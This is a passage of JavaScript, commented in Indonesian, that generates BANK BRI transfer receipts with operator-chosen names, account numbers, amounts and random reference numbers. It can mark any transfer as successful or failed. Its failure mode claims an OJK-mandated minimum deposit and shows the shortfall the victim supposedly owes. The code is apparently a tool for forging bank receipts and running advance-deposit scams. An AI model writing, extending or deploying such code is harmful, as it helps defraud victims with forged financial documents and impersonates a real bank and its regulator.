        button.addEventListener('click', handleBackspace);
    } else if (!button.classList.contains('blank')) {
        button.addEventListener('click', () => {
            handlePinInput(button.textContent.trim());
        });
    }
});
// --- FUNGSI BARU: Generate 12 Digit No. Ref ---
function generateRandomRef() {
    // Menghasilkan angka 12 digit
    const min = 100000000000;
    // 100 miliar
    const max = 999999999999;
    // 999... miliar
    const randomNum = Math.floor(Math.random() * (max - min + 1)) + min;
    return randomNum.toString();
}
// --- AKHIR FUNGSI BARU ---

// --- FUNGSI UPDATE BUKTI TRANSFER (DIPERBARUI) ---
function updateReceiptData() {
    // 1. Ambil Data
    const nominalValue = nominalInput.value;
    const catatanValue = catatanInput.value.trim();
    
    // Ambil data SUMBER (dari akun aktif)
    const activeAccount = sourceAccounts[activeAccountIndex];
    const sourceName = activeAccount.name;
    const sourceAccountNum = activeAccount.number;
    const sourceBank = "BANK BRI";
    // Ambil data TUJUAN (dari HTML dinamis)
    const destName = mainRecipientName.textContent.trim();
    const destAvatar = mainRecipientAvatar.textContent.trim(); 
    
    const destBankRaw = localStorage.getItem('recipientBankName') || 'NAMA BANK';
    const destBank = destBankRaw.toUpperCase(); 
    
    const destAccount = mainRecipientNumber.textContent.trim();
    // Ambil Waktu Saat Ini
    const now = new Date();
    const formattedDate = new Intl.DateTimeFormat('id-ID', {
        day: '2-digit', month: 'long', year: 'numeric', timeZone: 'Asia/Jakarta'
    }).format(now);
    const formattedTime = new Intl.DateTimeFormat('id-ID', {
        hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false, timeZone: 'Asia/Jakarta', timeZoneName: 'short'
    }).format(now).replace(/\./g, ':');
    const finalDateTimeString = `${formattedDate}, ${formattedTime}`;

    // 2. Format Data
    const finalAmount = 'Rp' + nominalValue;
    const maskedSourceAccount = sourceAccountNum; 
    const sourceInitial = getInitials(sourceName);

    // 3. Ambil Elemen di Bukti Transfer (Gunakan ID)
    const receiptTimestampEl = document.querySelector('#receipt-timestamp');
    const receiptAmountEl = document.querySelector('#receipt-total-amount');
    const receiptOjkLimitEl = document.querySelector('#dynamic-ojk-limit'); 
    
    const receiptSourceAvatar = document.querySelector('#receipt-source-avatar');
    const receiptSourceName = document.querySelector('#receipt-source-name');
    const receiptSourceBank = document.querySelector('#receipt-source-bank');
    const receiptSourceNumber = document.querySelector('#receipt-source-number');
    
    const receiptDestAvatar = document.querySelector('#receipt-dest-avatar');
    const receiptDestName = document.querySelector('#receipt-dest-name');
    const receiptDestBank = document.querySelector('#receipt-dest-bank');
    const receiptDestNumber = document.querySelector('#receipt-dest-number');
    // Ambil elemen detail tambahan
    const receiptTxType = document.querySelector('#receipt-tx-type');
    const receiptNotes = document.querySelector('#receipt-notes');
    const receiptNominalDetail = document.querySelector('#receipt-nominal-detail');
    const receiptAdminFee = document.querySelector('#receipt-admin-fee');
    // --- PERUBAHAN BARU: Ambil elemen deposito ---
    const depositoWajibRow = document.querySelector('#receipt-deposito-wajib-row');
    const depositoKurangRow = document.querySelector('#receipt-deposito-kurang-row');
    const depositoWajibValue = document.querySelector('#receipt-deposito-wajib');
    const depositoKurangValue = document.querySelector('#receipt-deposito-kurang');
    // --- AKHIR PERUBAHAN ---


    // 4. Set Data Baru ke Bukti Transfer
    receiptTimestampEl.textContent = finalDateTimeString;
    receiptAmountEl.textContent = finalAmount;
    
    const receiptRefEl = document.querySelector('#receipt-ref-number');
    if (receiptRefEl) {
        receiptRefEl.textContent = generateRandomRef();
    }

    // Set Jenis Transaksi
    if (receiptTxType) {
        receiptTxType.textContent = `Transfer ${destBank}`;
    }
    
    // Set Catatan
    if (receiptNotes) {
        receiptNotes.textContent = catatanValue === "" ?
        "-" : catatanValue;
    }
    
    // Set Nominal Detail
    if (receiptNominalDetail) {
        receiptNominalDetail.textContent = finalAmount;
        // Sama dengan total
    }
    
    // Set Biaya Admin
    if (receiptAdminFee) {
        if (destBank.includes('BRI')) {
            receiptAdminFee.textContent = "Rp0";
        } else {
            receiptAdminFee.textContent = "Rp6.500";
        }
    }
    
    // Set Data Sumber
    receiptSourceAvatar.textContent = sourceInitial;
    receiptSourceName.textContent = sourceName.toUpperCase(); 
    receiptSourceBank.textContent = sourceBank;
    receiptSourceNumber.textContent = maskedSourceAccount; 
    
    // Set Data Tujuan
    receiptDestAvatar.textContent = destAvatar;
    receiptDestName.textContent = destName; 
    receiptDestBank.textContent = destBank; 
    receiptDestNumber.textContent = destAccount;
    
    // Set Data Info OJK
    const formattedOjkLimit = new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', minimumFractionDigits: 0 }).format(MIN_TRANSFER_LIMIT).replace('Rp', 'Rp');
    if(receiptOjkLimitEl) receiptOjkLimitEl.textContent = formattedOjkLimit;
    
    // Set Status Berhasil/Gagal
    if (receiptStatusTitle && receiptStatusIcon && receiptOjkText) { 
        if (isSuccessMode) {
            // --- MODE BERHASIL ---
            receiptStatusTitle.textContent = "Transaksi Berhasil";
            receiptStatusIcon.src = "logo_sukses.gif"; 
            receiptStatusIcon.alt = "Berhasil";
            receiptOjkText.style.display = 'none'; // Sembunyikan teks OJK
            
            // --- PERUBAHAN BARU: Sembunyikan baris deposito ---
            if (depositoWajibRow) depositoWajibRow.style.display = 'none';
            if (depositoKurangRow) depositoKurangRow.style.display = 'none';
            // --- AKHIR PERUBAHAN ---
            
        } else {
            // --- MODE GAGAL ---
            receiptStatusTitle.textContent = "Transaksi Gagal";
            receiptStatusIcon.src = "icon-success.gif"; 
            receiptStatusIcon.alt = "Gagal";
            receiptOjkText.style.display = 'block'; // Tampilkan teks OJK

            // --- PERUBAHAN BARU: Hitung dan tampilkan baris deposito ---
            let rawValue = nominalInput.value.replace(/[^0-9]/g, '');
            let numericValue = rawValue === '' ? 0 : parseInt(rawValue, 10);
            let depositoKurang = MIN_TRANSFER_LIMIT - numericValue;
            // Formatter mata uang
            const currencyFormatter = new Intl.NumberFormat('id-ID', { 
                style: 'currency', 
                currency: 'IDR', 
            
                minimumFractionDigits: 0 
            });
            // --- PERUBAHAN REQ 1 & 2 DI SINI ---
            if (depositoWajibValue) {
                // PERUBAHAN REQ 1: .replace('Rp ', 'Rp') untuk hapus spasi
                depositoWajibValue.textContent = currencyFormatter.format(MIN_TRANSFER_LIMIT).replace('Rp ', 'Rp');
            }
            if (depositoKurangValue) {
                if (depositoKurang < 0) depositoKurang = 0;
                // PERUBAHAN REQ 1 & 2: Tambah '-', hapus spasi
                depositoKurangValue.textContent = '-' + currencyFormatter.format(depositoKurang).replace('Rp ', 'Rp');
            }
            // --- AKHIR PERUBAHAN ---
            
            if (depositoWajibRow) depositoWajibRow.style.display = 'flex';
            if (depositoKurangRow) depositoKurangRow.style.display = 'flex';
            // --- AKHIR PERUBAHAN ---
        }
    }
}

// --- LOGIKA TOMBOL SELESAI (BUKTI TRANSFER) ---
if (receiptOverlay && receiptDoneButton) {
    receiptDoneButton.addEventListener('click', (e) => {
        e.preventDefault();
        
        receiptOverlay.style.display = 'none';
        
        // Reset halaman utama
        nominalInput.value = ''; 
        continueButton.disabled = true; 
        
        const formattedMin = new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', minimumFractionDigits: 0 }).format(MIN_TRANSFER_LIMIT).replace('Rp', 'Rp');
        minTextElement.textContent = `Minimum transfer adalah ${formattedMin}`;
        minTextElement.style.color = originalMinColor;

        catatanInput.value = ''; 
        catatanInput.dispatchEvent(new Event('input')); 
        
        // --- BARU: Reset status ekspansi ---
        if (receiptExpandedDetails) {
            receiptExpandedDetails.classList.remove('expanded');
        }
        if (receiptToggleLink) {
            receiptToggleLink.classList.remove('expanded');
            const textSpan = receiptToggleLink.querySelector('span:first-child');
            if (textSpan) {
                textSpan.textContent = 'Lihat Detail Transaksi';
            }
        }
        // --- AKHIR RESET ---
        
        window.scrollTo(0, 0);
        // Tampilkan kembali layar setup
        setupOverlay.style.display = 'flex';
        // Panggil juga fungsi untuk MENGOSONGKAN form setup (REQ 2)
        loadSetupFormWithSavedData();
    });
}
